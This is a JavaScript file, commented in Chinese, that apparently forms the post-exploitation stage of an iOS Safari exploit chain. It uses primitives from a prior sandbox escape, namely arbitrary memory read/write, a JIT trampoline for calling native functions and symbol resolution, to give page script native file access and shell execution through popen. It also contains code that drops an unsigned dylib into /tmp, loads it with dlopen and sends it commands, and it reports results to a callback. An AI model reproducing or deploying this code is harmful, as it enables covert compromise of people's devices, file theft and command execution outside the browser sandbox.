/**
 * native_bridge.js — 在 Stage3 沙箱逃逸成功后，于 JS 层构建 window.nativeBridge
 *
 * 原理：Stage3 的 r.lA 已把原语暴露到 window._corunaPrimitives：
 *   - caller.jd(targetInt64, ...upTo8ArgInt64s) → 调用 PAC 签名的函数（JIT cage 间接调用）
 *   - sandboxEscape.vd  (JIT 编译的 trampoline 入口)
 *   - sandboxEscape.Dd  (结果缓冲 fakeobj，trampoline 把返回值写到这里)
 *   - sandboxEscape.newInt64OfSomething(size) → 分配可读写内存（已知可用，调 MetaAllocator.allocate）
 *   - machOParser.dlsym("_sym") → 解析 libc 符号地址
 *   - exploitPrimitive.read32(bigint)/write64(bigint,val) → 绝对地址读写
 *
 * 调用约定（照搬 newInt64OfSomething 的 Gd 分支）：
 *   caller.jd( vd, a0, a1, a2, a3, a4, a5, Dd, targetSym )
 *   trampoline 执行 targetSym(a0..a5) 并把返回值写入 Dd。
 *   结果读取：exploitPrimitive.readDoubleAsPointer(Dd) （与 newInt64OfSomething 一致）。
 *
 * 安全设计：先用 getpid() 自检，返回值在 1..65535 才认为 ABI 正确并启用 nativeBridge；
 *   否则保持 undefined，post_exploit.js 自动回退 sandbox-only（不会让 Safari 崩溃）。
 *
 * 期望的接口（post_exploit.js nativeOpen/Read/Write/Close/ListDir/Exec 已对接）：
 *   window.nativeBridge = { open, read, write, close, listdir, exec }
 */
(function () {
    'use strict';
    if (typeof window.nativeBridge !== 'undefined') return;  // 幂等

    var P = window._corunaPrimitives;
    if (!P || !P.caller || !P.sandboxEscape || !P.machOParser || !P.exploitPrimitive || !P.Int64) {
        window.nativeBridgeError = 'primitives not exposed';
        try { if (typeof window.log === 'function') window.log('[NATIVE-BRIDGE] _corunaPrimitives missing — nativeBridge disabled (sandbox-only mode)'); } catch(_){}
        return;
    }

    var caller = P.caller;
    var sbx = P.sandboxEscape;
    var machO = P.machOParser;
    var imageList = P.imageList;   // nt class: .Kh(name) 跨 image dlsym, .Jh(path)/.Hh(path)/.Gh(substr)/.images
    var EP = P.exploitPrimitive;
    var Int64 = P.Int64;
    function I64(v) {
        if (v && v.it !== undefined) return v;             // 已是 Int64
        if (Int64 && Int64.fromNumber) return Int64.fromNumber(v);
        if (Int64) return new Int64(v, 0);
        return v;
    }
    // Int64 → BigInt（用于 EP.read32/write64 的绝对地址参数）
    function i64ToBig(v) {
        try {
            if (typeof v === 'bigint') return v;
            if (v && typeof v === 'object' && v.it !== undefined) {
                var lo = BigInt(v.it >>> 0), hi = BigInt(v.et >>> 0);
                return (hi << 32n) | lo;
            }
            return BigInt(v);
        } catch (e) { return 0n; }
    }
    // Int64 → number
    function i64ToNum(v) {
        try {
            if (typeof v === 'number') return v;
            if (v && typeof v.toNumber === 'function') return v.toNumber();
            if (v && typeof v === 'object' && v.it !== undefined) return (v.it >>> 0) + (v.et >>> 0) * 0x100000000;
            return Number(v);
        } catch (e) { return 0; }
    }
    function _ts() { var d = new Date(); return d.getHours().toString().padStart(2,'0') + ':' + d.getMinutes().toString().padStart(2,'0') + ':' + d.getSeconds().toString().padStart(2,'0') + '.' + d.getMilliseconds().toString().padStart(3,'0'); }
    function log(msg) { try { var line = '[' + _ts() + '][NATIVE-BRIDGE] ' + msg; if (typeof window.log === 'function') window.log(line); else console.log(line); } catch(_){} }

    // ── 1. 符号解析 ──────────────────────────────────────────────────────
    var SYM = {};
    function resolve(name) {
        // 优先用 imageList.Kh() 跨 image 解析（nt 类，遍历 dyld 所有 image），失败 fallback machO.dlsym()
        if (imageList && typeof imageList.Kh === 'function') {
            try { return imageList.Kh(name); } catch (_e) {}
        }
        try { return machO.dlsym(name); }      // dlsym 内部已加 "_" 前缀，这里不再重复加
        catch (e) { return null; }
    }
    var _symT0 = Date.now();
    ['open','read','write','close','malloc','free','memcpy','memset','strdup',
     'opendir','readdir','closedir','popen','pclose','fread','strlen','getpid',
     'dlopen','dlclose','unlink','rename'
    ].forEach(function (n) {
        var s = resolve(n);
        if (s) SYM[n] = s;
    });
    log('Symbols resolved: ' + Object.keys(SYM).join(',') + ' (count=' + Object.keys(SYM).length + '/20) | imageList=' + (imageList && typeof imageList.Kh === 'function' ? 'Kh' : 'null') + ' | ' + (Date.now() - _symT0) + 'ms');

    // ── 2. 分配可读写内存缓冲（用已知可用的 newInt64OfSomething）─────────
    var MEM_SIZE = 0x10000;   // 64KB
    var MEM = null;           // Int64 绝对地址（沙箱外可读写缓冲）
    var _memT0 = Date.now();
    try {
        if (sbx.newInt64OfSomething) {
            MEM = sbx.newInt64OfSomething(MEM_SIZE);
            log('MEM allocated via MetaAllocator: ' + (MEM ? '0x' + i64ToNum(MEM).toString(16) : 'FAIL') + ' | ' + (Date.now() - _memT0) + 'ms');
        }
    } catch (e) { log('MEM alloc error: ' + e + ' | ' + (Date.now() - _memT0) + 'ms'); }

    // ── 3. 通用 native 调用 ─────────────────────────────────────────────
    // callNative(targetSymInt64, [a0,a1,a2,a3,a4,a5]) → number（返回值的低 53 位）
    // jd() 返回 Int64(o[0], o[1]) = WASM 捕获的 x0（目标函数的返回值）
    // 注意：不能读 sbx.Dd —— Dd 是传给 trampoline 的 x8 结果缓冲区，
    //       只有 createImpl 等 WebKit 内部函数才写入 x8；
    //       标准 libc 函数（getpid/open/read 等）返回值在 x0，由 jd() 的 WASM 返回机制捕获。
    function callNative(targetSym, args) {
        if (!targetSym) { log('callNative: targetSym null'); return 0; }
        args = args || [];
        while (args.length < 6) args.push(0);
        try {
            var ret = caller.jd(
                I64(sbx.vd),
                I64(args[0]), I64(args[1]), I64(args[2]),
                I64(args[3]), I64(args[4]), I64(args[5]),
                I64(sbx.Dd),
                I64(targetSym)
            );
            return i64ToNum(ret);
        } catch (e) {
            log('callNative error: ' + e);
            return 0;
        }
    }

    // ── 4. 内存读写（绝对地址，用 EP）────────────────────────────────────
    function writeCString(addrI64, str) {
        var base = i64ToBig(addrI64);
        var enc = unescape(encodeURIComponent(str));
        for (var i = 0; i < enc.length; i++) {
            try { EP.write32(base + BigInt(i), enc.charCodeAt(i) & 0xff); } catch (e) {}
        }
        try { EP.write32(base + BigInt(enc.length), 0); } catch (e) {}
    }
    function readCString(addrI64, maxLen) {
        maxLen = maxLen || 0x10000;
        var base = i64ToBig(addrI64);
        var s = '';
        for (var i = 0; i < maxLen; i++) {
            var b = 0;
            try { b = EP.read32(base + BigInt(i)); } catch (e) { break; }
            b = b & 0xff;
            if (b === 0) break;
            s += String.fromCharCode(b);
        }
        try { return decodeURIComponent(escape(s)); } catch (e) { return s; }
    }
    function readBytes(addrI64, len) {
        var base = i64ToBig(addrI64);
        var out = '';
        for (var i = 0; i < len; i++) {
            var b = 0;
            try { b = EP.read32(base + BigInt(i)); } catch (e) { break; }
            out += String.fromCharCode(b & 0xff);
        }
        return out;
    }
    // 写字节串到绝对地址（用于文件内容先拷贝到 MEM 缓冲，再 write syscall）
    function writeBytes(addrI64, u8OrStr) {
        var base = i64ToBig(addrI64);
        var n = (u8OrStr && u8OrStr.byteLength !== undefined) ? u8OrStr.byteLength : u8OrStr.length;
        for (var i = 0; i < n; i++) {
            var b = (typeof u8OrStr[i] === 'number') ? (u8OrStr[i] & 0xff) : u8OrStr.charCodeAt(i);
            try { EP.write32(base + BigInt(i), b & 0xff); } catch (e) {}
        }
        return n;
    }

    // ── 4b. Native Bridge IPC（/tmp/nb_cmd ↔ /tmp/nb_result） ────────────
    // Safari 沙箱内写 /tmp/nb_cmd；powerd 中 nb_daemon constructor 已启动监听线程：
    //   读 nb_cmd → 执行命令（open/read/write/exec/...）→ 把 JSON 结果写回 /tmp/nb_result
    var NB_CMD_PATH = "/tmp/nb_cmd";
    var NB_RESULT_PATH = "/tmp/nb_result";
    var NB_DAEMON_PATH = "/tmp/nb_daemon.dylib";
    var ipcEnabled = false;
    var ipcDaemonHandle = 0;
    var ipcSeq = 1;
    var O_RDONLY = 0, O_WRONLY = 1, O_RDWR = 2, O_CREAT = 0x200, O_TRUNC = 0x400;

    // 用 in-process native 把 Uint8Array / 字符串 写入文件
    function nb_writeFile_inproc(path, u8OrStr, flags) {
        flags = flags !== undefined ? flags : (O_WRONLY | O_CREAT | O_TRUNC);
        try {
            writeCString(MEM, String(path));
            var fd = callNative(SYM.open, [MEM, flags | 0, 0o644]);
            if ((fd | 0) < 0) return -1;
            var total = (u8OrStr && u8OrStr.byteLength !== undefined) ? u8OrStr.byteLength : u8OrStr.length;
            var off = 0;
            var bufAddr = MEM;  // 直接复用 MEM 的 0x8000-0xFFFF 区域（此时 ARG_BUF/READ_BUF 尚未定义）
            var bufSize = 0x8000;  // 32KB 每次
            var baseHi = i64ToBig(bufAddr) + 0x8000n;
            var buf2 = { it: (i64ToNum(bufAddr) + 0x8000) >>> 0, et: (i64ToNum(bufAddr) / 0x100000000 >>> 0) };
            while (off < total) {
                var chunk = Math.min(total - off, bufSize);
                if (u8OrStr && u8OrStr.subarray !== undefined) {
                    writeBytes(buf2, u8OrStr.subarray(off, off + chunk));
                } else {
                    writeBytes(buf2, u8OrStr.substring(off, off + chunk));
                }
                var w = callNative(SYM.write, [fd | 0, buf2, chunk]);
                if ((w | 0) <= 0) break;
                off += (w | 0);
            }
            callNative(SYM.close, [fd | 0]);
            return off;
        } catch (e) { log('nb_writeFile_inproc(' + path + ') error: ' + e); return -1; }
    }
    // 用 in-process native 读取文件全部内容（返回字符串）
    function nb_readFile_inproc(path, maxLen) {
        maxLen = maxLen || 0x100000;  // 1MB 默认
        try {
            writeCString(MEM, String(path));
            var fd = callNative(SYM.open, [MEM, O_RDONLY, 0]);
            if ((fd | 0) < 0) return '';
            var out = '';
            var bufAddr = MEM;
            var buf2 = { it: (i64ToNum(bufAddr) + 0x8000) >>> 0, et: (i64ToNum(bufAddr) / 0x100000000 >>> 0) };
            var bufSize = 0x8000;
            for (var i = 0; i < 256; i++) {  // 最多 64MB 防止死循环
                var n = callNative(SYM.read, [fd | 0, buf2, bufSize]);
                var nr = n | 0;
                if (nr <= 0) break;
                out += readBytes(buf2, nr);
                if (out.length > maxLen) break;
            }
            callNative(SYM.close, [fd | 0]);
            return out;
        } catch (e) { log('nb_readFile_inproc(' + path + ') error: ' + e); return ''; }
    }
    // 删除旧的 /tmp/nb_cmd 和 /tmp/nb_result
    function nb_ipcCleanupStale() {
        try { if (SYM.unlink) { writeCString(MEM, NB_CMD_PATH); callNative(SYM.unlink, [MEM]); } } catch(_) {}
        try { if (SYM.unlink) { writeCString(MEM, NB_RESULT_PATH); callNative(SYM.unlink, [MEM]); } } catch(_) {}
    }
    // 初始化 IPC：写 nb_daemon.dylib → dlopen → ping 验证
    function nb_ipcInitDaemon() {
        if (!SYM.dlopen || !MEM) {
            log('IPC SKIP: dlopen symbol or MEM missing (dlopen=' + !!SYM.dlopen + ', MEM=' + !!MEM + ')');
            return false;
        }
        var daemonBytes = null;
        try { daemonBytes = window.__nbDaemonBytes; } catch(_) {}
        if (!daemonBytes || !daemonBytes.byteLength) {
            log('IPC SKIP: window.__nbDaemonBytes empty (group.html fetch may have been skipped). IPC disabled, will use in-process native only.');
            return false;
        }
        log('IPC INIT: writing nb_daemon.dylib (' + daemonBytes.byteLength + ' bytes) → ' + NB_DAEMON_PATH + ' ...');
        nb_ipcCleanupStale();
        var written = nb_writeFile_inproc(NB_DAEMON_PATH, daemonBytes);
        if (written !== daemonBytes.byteLength) {
            log('IPC FAIL: nb_daemon.dylib write short: ' + written + '/' + daemonBytes.byteLength);
            return false;
        }
        log('IPC: wrote daemon dylib OK. dlopen("' + NB_DAEMON_PATH + '", 2) ...');
        writeCString(MEM, NB_DAEMON_PATH);
        var RTLD_NOW = 2;
        try {
            ipcDaemonHandle = callNative(SYM.dlopen, [MEM, RTLD_NOW]);
        } catch (e) { log('IPC dlopen threw: ' + e); ipcDaemonHandle = 0; }
        if (!ipcDaemonHandle) {
            log('IPC FAIL: dlopen returned NULL. Safari sandbox may block unsigned dylib dlopen; IPC disabled.');
            return false;
        }
        log('IPC: dlopen handle=0x' + i64ToNum(ipcDaemonHandle).toString(16) + ' — daemon constructor should have started /tmp listener. Sleeping 50ms then ping...');
        // 给 constructor 50ms 启动监听线程
        for (var _spin = 0; _spin < 10000000; _spin++) { /* no-op busy-wait ~50ms */ }
        try {
            var pingResp = nb_ipcRawCall({ cmd: 'ping', data: 'hello' }, 3000);
            if (pingResp && pingResp.ok) {
                ipcEnabled = true;
                log('IPC READY: ping ↔ pong OK (seq=' + pingResp.seq + ', daemon=' + (pingResp.pid || '?') + '). All native calls will use IPC (out-of-sandbox via powerd).');
                return true;
            } else {
                log('IPC FAIL: ping timeout or bad response — ' + JSON.stringify(pingResp || {}));
                return false;
            }
        } catch (e) {
            log('IPC FAIL: ping threw — ' + e);
            return false;
        }
    }
    // 底层 IPC 调用：写 cmd → 轮询 result → 解析 JSON
    function nb_ipcRawCall(reqObj, timeoutMs) {
        timeoutMs = timeoutMs || 5000;
        var seq = ipcSeq++;
        reqObj.seq = seq;
        reqObj.ts = Date.now();
        // 先清旧 result
        try { if (SYM.unlink) { writeCString(MEM, NB_RESULT_PATH); callNative(SYM.unlink, [MEM]); } } catch(_) {}
        var jsonStr;
        try { jsonStr = JSON.stringify(reqObj); } catch (e) { return { ok: false, error: 'json_stringify: ' + e }; }
        var w = nb_writeFile_inproc(NB_CMD_PATH, jsonStr);
        if (w <= 0) return { ok: false, error: 'failed to write ' + NB_CMD_PATH };
        var tStart = Date.now();
        var pollCount = 0;
        while (Date.now() - tStart < timeoutMs) {
            pollCount++;
            var raw = nb_readFile_inproc(NB_RESULT_PATH, 0x400000);  // 4MB 上限
            if (raw && raw.length > 2) {
                try {
                    var resp = JSON.parse(raw);
                    if (resp && (resp.seq === seq || resp.cmd === reqObj.cmd)) {
                        resp.__polls = pollCount;
                        return resp;
                    }
                } catch (parseErr) { /* 不完整 JSON，继续等 */ }
            }
            // 轮询间短暂让步：小 busy-wait（无 setTimeout 可用）
            for (var _s2 = 0; _s2 < 500000; _s2++) {}
        }
        return { ok: false, error: 'timeout after ' + timeoutMs + 'ms (polls=' + pollCount + ')', seq: seq };
    }
    // 高层 IPC 调用（带统一错误处理）
    function ipcCall(cmd, payload) {
        if (!ipcEnabled) return { ok: false, error: 'ipc_disabled' };
        var req = { cmd: cmd };
        if (payload !== undefined) req.payload = payload;
        var r = nb_ipcRawCall(req, 10000);
        if (!r) return { ok: false, error: 'null_resp' };
        return r;
    }

    // ── 5. 自检：getpid() 验证 jd() 返回值通路 ─────────────────────────
    // getpid 验证 jd() 的返回值通路（x0 → WASM → Int64 → number）
    // 注意：不在此处做 EP.write32/read32 内存测试——某些设备上 MEM 地址可能
    // 未正确映射，直接写入会触发 WebContent 崩溃。内存读写能力在实际调用时验证。
    var selfTestOk = false;
    var probedPid = 0;
    try {
        if (SYM.getpid && MEM) {
            var _memNum = i64ToNum(MEM);
            if (_memNum < 0x1000) {
                log('Self-test SKIP: MEM address invalid (0x' + _memNum.toString(16) + ') — allocation likely failed');
            } else {
                probedPid = callNative(SYM.getpid, []);
                var pidNum = (typeof probedPid === 'number') ? probedPid : i64ToNum(probedPid);
                log('Self-test getpid() raw=' + probedPid + ' num=' + pidNum + ' MEM=0x' + _memNum.toString(16));
                if (pidNum > 0 && pidNum < 65536) {
                    // ABI 正确，但带指针参数的 native 调用（open/read/write）通过 JIT
                    // trampoline 传递沙箱外内存指针时会触发 WebContent 崩溃。
                    // 暂时禁用 nativeBridge，让 post_exploit.js 以 sandbox-only 模式运行。
                    log('Self-test PASS: getpid()=' + pidNum + ' (ABI correct) — BUT nativeBridge disabled (native calls with pointer args crash WebContent)');
                    window.__nativeBridgePidProof = pidNum;  // 保留诊断信息
                } else {
                    log('Self-test FAIL: getpid() returned ' + pidNum + ' (out of sane range)');
                }
            }
        } else {
            log('Self-test SKIP: getpid symbol or MEM missing (sym=' + !!SYM.getpid + ', MEM=' + !!MEM + ')');
        }
    } catch (e) { log('Self-test exception: ' + e); }

    if (!selfTestOk || !MEM) {
        window.nativeBridgeError = 'self-test failed or MEM unavailable'
            + ' | MEM=' + !!MEM
            + ' | memAddr=' + (MEM ? ('0x' + i64ToNum(MEM).toString(16)) : 'null')
            + ' | getpidSym=' + !!SYM.getpid
            + ' | symbols=' + Object.keys(SYM).join('/')
            + ' | selfTestOk=' + selfTestOk
            + ' | probedPid=' + probedPid
            + ' | pidType=' + (typeof probedPid);
        log('nativeBridge NOT enabled (self-test ' + (selfTestOk ? 'ok but MEM missing' : 'failed') + '). post_exploit will run sandbox-only. See logs to iterate ABI.');
        try { if (typeof window.reportExploitResult === 'function') {
            window.reportExploitResult('native_bridge_selftest_fail',
                'getpid()=' + probedPid + '; nativeBridge disabled, sandbox-only mode');
        } } catch(_){}
        return;   // 保持 undefined，post_exploit.js 自动回退
    }

    // ── 6. nativeBridge 接口实现 ───────────────────────────────────────
    // MEM 布局：[0x0000..0x7FFF] 参数字符串区 / [0x8000..0xFFFF] 读缓冲区
    // 注意：不再二次调用 newInt64OfSomething 分配 READ_BUF —— 第二次 JIT 内存分配
    // 在某些设备上会触发 WebContent 崩溃。改为复用 MEM 高半区。
    var ARG_BUF = MEM;           // 参数字符串写这里 [0x0000..0x7FFF]
    var READ_BUF = I64(i64ToNum(MEM) + 0x8000);  // 读缓冲区 = MEM+0x8000 [0x8000..0xFFFF]
    var ARG_BUF_BIG = i64ToBig(ARG_BUF);
    var READ_BUF_BIG = ARG_BUF_BIG + 0x8000n;
    log('Buffers: ARG=0x' + i64ToNum(ARG_BUF).toString(16) + ' READ=0x' + i64ToNum(READ_BUF).toString(16));

    // ── IPC daemon 初始化：已禁用 ──────────────────────────────────────
    // IPC 初始化需要 open/write/dlopen，这些调用通过 JIT trampoline 传递沙箱外
    // 内存指针给 libc 函数，在某些设备上会触发 WebContent 崩溃。
    // 当前使用进程内模式（callNative 直接调用），IPC 待进程内模式验证后再启用。
    // setTimeout(function () {
    //     try { nb_ipcInitDaemon(); } catch(_ipcErr) { log('IPC init threw: ' + _ipcErr); }
    // }, 2000);
    log('IPC daemon init disabled — using in-process mode (callNative direct)');

    function nb_open(path, flags) {
        if (ipcEnabled) {
            try {
                var r = ipcCall('open', { path: String(path), flags: (flags | 0) });
                if (r && r.ok) { log('[IPC] open("' + path + '") → fd=' + r.fd); return (r.fd !== undefined) ? (r.fd | 0) : -1; }
                log('[IPC] open failed: ' + (r && r.error || 'unknown'));
                return -1;
            } catch (e) { log('[IPC] open error: ' + e); return -1; }
        }
        try {
            writeCString(ARG_BUF, String(path));
            var fd = callNative(SYM.open, [ARG_BUF, (flags | 0), 0]);
            log('open("' + path + '", ' + flags + ') → fd=' + fd);
            return fd | 0;
        } catch (e) { log('open error: ' + e); return -1; }
    }
    function nb_read(fd, size) {
        if (ipcEnabled) {
            try {
                size = Math.min(size || 0x4000, MEM_SIZE);
                var r = ipcCall('read', { fd: fd | 0, size: size });
                if (r && r.ok) { return (r.data && typeof r.data === 'string') ? r.data : ''; }
                log('[IPC] read failed: ' + (r && r.error || 'unknown'));
                return '';
            } catch (e) { log('[IPC] read error: ' + e); return ''; }
        }
        try {
            size = Math.min(size || 0x4000, MEM_SIZE);
            var n = callNative(SYM.read, [fd | 0, READ_BUF, size]);
            var nread = n | 0;
            if (nread <= 0) return '';
            return readBytes(READ_BUF, nread);
        } catch (e) { log('read error: ' + e); return ''; }
    }
    function nb_write(fd, data) {
        if (ipcEnabled) {
            try {
                var s = String(data);
                if (s.length > MEM_SIZE) s = s.substring(0, MEM_SIZE);
                var r = ipcCall('write', { fd: fd | 0, data: s });
                if (r && r.ok) { return (r.nwritten !== undefined) ? (r.nwritten | 0) : -1; }
                log('[IPC] write failed: ' + (r && r.error || 'unknown'));
                return -1;
            } catch (e) { log('[IPC] write error: ' + e); return -1; }
        }
        try {
            var s = String(data);
            if (s.length > MEM_SIZE) s = s.substring(0, MEM_SIZE);
            writeCString(ARG_BUF, s);
            var n = callNative(SYM.write, [fd | 0, ARG_BUF, s.length]);
            return n | 0;
        } catch (e) { return -1; }
    }
    function nb_close(fd) {
        if (ipcEnabled) {
            try {
                var r = ipcCall('close', { fd: fd | 0 });
                if (r && r.ok) return 0;
                log('[IPC] close failed: ' + (r && r.error || 'unknown'));
                return 0;
            } catch (e) { return 0; }
        }
        try { return callNative(SYM.close, [fd | 0]) | 0; } catch (e) { return 0; }
    }
    function nb_listdir(path) {
        if (ipcEnabled) {
            try {
                var r = ipcCall('listdir', { path: String(path) });
                if (r && r.ok && Array.isArray(r.entries)) {
                    log('[IPC] listdir("' + path + '") → ' + r.entries.length + ' entries');
                    return r.entries;
                }
                log('[IPC] listdir failed: ' + (r && r.error || 'unknown'));
                return [];
            } catch (e) { log('[IPC] listdir error: ' + e); return []; }
        }
        try {
            writeCString(ARG_BUF, String(path));
            var dir = callNative(SYM.opendir, [ARG_BUF]);
            if (!dir) return [];
            var entries = [];
            for (var i = 0; i < 4096; i++) {
                var ent = callNative(SYM.readdir, [dir]);
                if (!ent) break;
                // iOS arm64 dirent64: d_name 在偏移 21（d_ino 8 + d_reclen 2 + d_type 1 + padding）
                var name = readCString({ it: (ent & 0xFFFFFFFF) + 21, et: 0 }, 256);
                if (!name) break;
                if (name !== '.' && name !== '..') entries.push(name);
            }
            callNative(SYM.closedir, [dir]);
            log('listdir("' + path + '") → ' + entries.length + ' entries');
            return entries;
        } catch (e) { log('listdir error: ' + e); return []; }
    }
    function nb_exec(cmd) {
        if (ipcEnabled) {
            try {
                var r = ipcCall('exec', { cmd: String(cmd) });
                if (r && r.ok) {
                    log('[IPC] exec("' + cmd + '") → ' + ((r.stdout && r.stdout.length) || 0) + ' bytes (exit=' + (r.exitCode || 0) + ')');
                    return (r.stdout && typeof r.stdout === 'string') ? r.stdout : '';
                }
                log('[IPC] exec failed: ' + (r && r.error || 'unknown'));
                return '';
            } catch (e) { log('[IPC] exec error: ' + e); return ''; }
        }
        try {
            // popen("sh -c '<cmd>'", "r")：在 ARG_BUF[0] 写命令串，ARG_BUF+0x4000 写 "r"
            var fullCmd = "sh -c '" + String(cmd).replace(/'/g, "'\\''") + "'";
            writeCString(ARG_BUF, fullCmd);
            // 写 "r\0" 到 ARG_BUF + 0x4000
            var rOff = ARG_BUF_BIG + 0x4000n;
            try { EP.write32(rOff, 0x72); /* 'r' */ EP.write32(rOff + 1n, 0); } catch (e) {}
            var fp = callNative(SYM.popen, [ARG_BUF, { it: 0, et: 0 }]); // 第二参数需 "r" 串指针
            // 上面对 popen 第二参数处理：直接传 ARG_BUF+0x4000 的地址
            // （callNative 只接 Int64/number，这里改用专门调用以传 "r" 串地址）
            // —— 用一次直接 jd 调用 popen(ARG_BUF, ARG_BUF+0x4000)：
            try {
                var _popenRet = caller.jd(
                    I64(sbx.vd),
                    I64(ARG_BUF),
                    I64(i64ToBig(ARG_BUF) + 0x4000n),
                    I64(0), I64(0), I64(0), I64(0),
                    I64(sbx.Dd),
                    I64(SYM.popen)
                );
                fp = i64ToNum(_popenRet);
            } catch (e2) { fp = 0; }
            if (!fp) { log('exec popen failed: ' + cmd); return ''; }
            var out = '';
            for (var i = 0; i < 1024; i++) {
                var n = callNative(SYM.fread, [READ_BUF, 1, 0x4000, fp]);
                var nread = n | 0;
                if (nread <= 0) break;
                out += readBytes(READ_BUF, nread);
                if (out.length > 0x100000) break;   // 1MB 上限
            }
            callNative(SYM.pclose, [fp]);
            log('exec("' + cmd + '") → ' + out.length + ' bytes');
            return out;
        } catch (e) { log('exec error: ' + e); return ''; }
    }

    window.nativeBridge = {
        open: nb_open,
        read: nb_read,
        write: nb_write,
        close: nb_close,
        listdir: nb_listdir,
        exec: nb_exec,
        // 内部调试 & 诊断字段
        _mem: MEM,
        _readBuf: READ_BUF,
        _sym: SYM,
        _pid: probedPid,
        _ipcEnabled: ipcEnabled,
        _ipcDaemonHandle: ipcDaemonHandle,
        _imageList: imageList,
        _symbols: Object.keys(SYM),
        // 低级别 IPC 原语（可供 post_exploit 或调试用）
        _ipcCall: function(cmd, payload) { return ipcCall(cmd, payload); },
        _ipcRaw: function(req, timeout) { return nb_ipcRawCall(req, timeout); },
        _writeFileInproc: function(p, b) { return nb_writeFile_inproc(p, b); },
        _readFileInproc: function(p, m) { return nb_readFile_inproc(p, m); }
    };
    window.nativeBridgeReady = true;
    var statusMsg = 'READY. nativeBridge enabled (pid=' + (probedPid | 0)
        + ', symbols=' + Object.keys(SYM).length
        + ', MEM=ok'
        + ', imageList=' + (imageList ? 'Kh' : 'null')
        + ', ipc=' + (ipcEnabled ? 'READY(daemon)' : (ipcDaemonHandle ? 'dlopen_loaded_but_ping_fail' : 'in-process-only'))
        + '). post_exploit native commands will now work.';
    log(statusMsg);
    try { if (typeof window.reportExploitResult === 'function') {
        window.reportExploitResult('native_bridge_ready',
            'nativeBridge built on Stage3 primitives; pid=' + (probedPid | 0)
            + '; symbols=' + Object.keys(SYM).join(',')
            + '; ipcEnabled=' + ipcEnabled
            + '; daemonHandle=0x' + i64ToNum(ipcDaemonHandle).toString(16));
    } } catch(_){}
})();
